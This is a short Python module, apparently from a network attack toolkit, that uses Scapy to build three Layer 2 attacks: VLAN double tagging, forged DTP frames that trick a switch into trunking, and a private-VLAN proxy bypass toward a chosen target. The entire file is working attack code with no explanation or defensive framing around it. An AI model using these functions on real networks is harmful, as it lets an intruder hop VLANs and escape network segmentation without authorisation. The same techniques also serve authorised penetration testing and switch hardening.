from scapy.contrib.dtp import *
from scapy.layers.l2 import Dot3, SNAP, Dot1Q, Ether
from scapy.layers.inet import IP
from scapy.all import get_if_hwaddr, get_if_addr

from libs.aux_funcs import type_wrapper

@type_wrapper(category="middleware", name="Double Tagging", layer="Layer 2", type="wrapper")
def vlan_double_tagging(packet, vlan_out, vlan_in):
    return Dot1Q(vlan=vlan_out)/Dot1Q(vlan=vlan_in)/packet

@type_wrapper(category="middleware", name= "DTP Trunk Negotiation", type="single use", layer="Layer 2")
def vlan_dtp_attack(interface):
    pkt = Dot3(src=get_if_hwaddr(interface), dst="01:00:0c:cc:cc:cc")/SNAP()/DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor(neighbor=get_if_hwaddr(interface))])
    sendp(pkt, iface=interface)

@type_wrapper(category="middleware", name="PVLAN Proxy", type="wrapper", layer="Layer 2")
def vlan_pvlan_proxy(interface, target_ip, target_mac, packet):
    pkt = Ether(src=get_if_hwaddr(interface), dst=target_mac)/IP(src=get_if_addr(interface), dst=target_ip)/packet
    sendp(pkt, iface=interface)